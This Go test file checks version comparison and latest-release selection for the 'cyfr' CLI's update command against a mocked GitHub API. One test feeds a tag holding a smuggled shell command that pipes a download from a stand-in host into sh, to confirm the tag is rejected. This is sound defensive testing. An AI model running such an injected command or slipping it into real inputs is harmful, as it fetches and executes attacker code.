// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 CYFR Works Inc.

package release

import (
	"context"
	"errors"
	"net/http"
	"net/http/httptest"
	"testing"
)

func TestIsNewer(t *testing.T) {
	cases := []struct {
		latest, current string
		want            bool
	}{
		{"0.5.4", "0.5.3", true},
		{"0.5.3", "0.5.3", false},
		{"0.5.3", "0.5.4", false},
		{"1.0.0", "0.9.9", true},
		{"0.6.0", "0.5.9", true},
		{"0.5.10", "0.5.9", true},                // numeric, not lexical, compare
		{"v0.5.4", "0.5.3", false},               // a prefix is no release version
		{"0.5.4", "dev", false},                  // unreleased current -> no notice
		{"dev", "0.5.3", false},                  // unparseable latest -> no notice
		{"0.5.4-rc1", "0.5.3", true},             // a later line's pre-release
		{"0.6.0", "0.6.0-alpha.1", true},         // the release after its pre-release
		{"0.6.0-alpha.1", "0.6.0", false},        // a pre-release before its release
		{"0.6.0-alpha.2", "0.6.0-alpha.1", true}, // pre-releases in order
		{"0.5", "0.5.3", false},                  // not three parts -> no notice
		{"", "0.5.3", false},
	}
	for _, c := range cases {
		if got := IsNewer(c.latest, c.current); got != c.want {
			t.Errorf("IsNewer(%q, %q) = %v, want %v", c.latest, c.current, got, c.want)
		}
	}
}

// withAPIURL points apiURL at a test server for the duration of the test.
func withAPIURL(t *testing.T, body string, status int) {
	t.Helper()
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if status != http.StatusOK {
			w.WriteHeader(status)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(body))
	}))
	old := apiURL
	apiURL = srv.URL
	t.Cleanup(func() {
		apiURL = old
		srv.Close()
	})
}

func TestLatestPicksNewestBareTag(t *testing.T) {
	// Newest first; the "porta-v*" desktop tag must be skipped.
	withAPIURL(t, `[
		{"tag_name": "porta-v1.2.0"},
		{"tag_name": "0.5.4"},
		{"tag_name": "0.5.3"}
	]`, http.StatusOK)

	got, err := Latest(context.Background())
	if err != nil {
		t.Fatalf("Latest returned error: %v", err)
	}
	if got != "0.5.4" {
		t.Errorf("Latest = %q, want %q", got, "0.5.4")
	}
}

func TestLatestSkipsLegacyV(t *testing.T) {
	withAPIURL(t, `[{"tag_name": "v0.4.0"}, {"tag_name": "0.5.4"}]`, http.StatusOK)

	got, err := Latest(context.Background())
	if err != nil {
		t.Fatalf("Latest returned error: %v", err)
	}
	if got != "0.5.4" {
		t.Errorf("Latest = %q, want %q (legacy v* tag should be skipped)", got, "0.5.4")
	}
}

func TestLatestNon200(t *testing.T) {
	withAPIURL(t, "", http.StatusForbidden)

	if _, err := Latest(context.Background()); err == nil {
		t.Error("Latest should return an error on a non-200 response")
	}
}

// No release that is not a pre-release answers ErrNoRelease, whether the
// list is empty, holds only other tags or only pre-releases, flagged by
// GitHub or by their tag alone.
func TestLatestNoReleases(t *testing.T) {
	for name, body := range map[string]string{
		"none":                 `[]`,
		"a desktop release":    `[{"tag_name": "porta-v1.0.0"}]`,
		"flagged pre-releases": `[{"tag_name": "0.6.0-alpha.1", "prerelease": true}, {"tag_name": "0.6.0", "prerelease": true}]`,
		"pre-release tags":     `[{"tag_name": "0.6.0-alpha.1"}, {"tag_name": "0.6.0-beta.1"}]`,
		"a draft":              `[{"tag_name": "0.6.0", "draft": true}]`,
	} {
		withAPIURL(t, body, http.StatusOK)
		if _, err := Latest(context.Background()); !errors.Is(err, ErrNoRelease) {
			t.Errorf("%s: Latest = %v, want ErrNoRelease", name, err)
		}
	}
}

// A pre-release tag GitHub does not flag is skipped all the same, and a
// later release outranks it.
func TestLatestSkipsPrereleaseTags(t *testing.T) {
	withAPIURL(t, `[
		{"tag_name": "0.7.0-rc.1"},
		{"tag_name": "0.6.0"},
		{"tag_name": "0.6.0-alpha.1", "prerelease": true}
	]`, http.StatusOK)

	got, err := Latest(context.Background())
	if err != nil {
		t.Fatalf("Latest returned error: %v", err)
	}
	if got != "0.6.0" {
		t.Errorf("Latest = %q, want %q", got, "0.6.0")
	}
}

// `cyfr update` names release URLs and file names from the tag, so a tag
// that is no release version must never be selected.
func TestLatestRejectsShellMetacharacters(t *testing.T) {
	withAPIURL(t, `[
		{"tag_name": "0;curl evil.example|sh;#"},
		{"tag_name": "0.5.4-rc1"},
		{"tag_name": "0.5.4 "},
		{"tag_name": "0.5.4"}
	]`, http.StatusOK)

	got, err := Latest(context.Background())
	if err != nil {
		t.Fatalf("Latest returned error: %v", err)
	}
	if got != "0.5.4" {
		t.Errorf("Latest = %q, want %q", got, "0.5.4")
	}
}

// The greatest version wins whatever order the API lists releases in: a
// later-published patch of an older line is not the latest, versions
// compare numerically, and drafts and pre-releases are skipped.
func TestLatestPicksTheGreatestVersion(t *testing.T) {
	withAPIURL(t, `[
		{"tag_name": "0.5.12"},
		{"tag_name": "0.11.0", "draft": true},
		{"tag_name": "0.10.0", "prerelease": true},
		{"tag_name": "0.9.1"},
		{"tag_name": "0.6.3"}
	]`, http.StatusOK)

	got, err := Latest(context.Background())
	if err != nil {
		t.Fatalf("Latest returned error: %v", err)
	}
	if got != "0.9.1" {
		t.Errorf("Latest = %q, want %q", got, "0.9.1")
	}
}
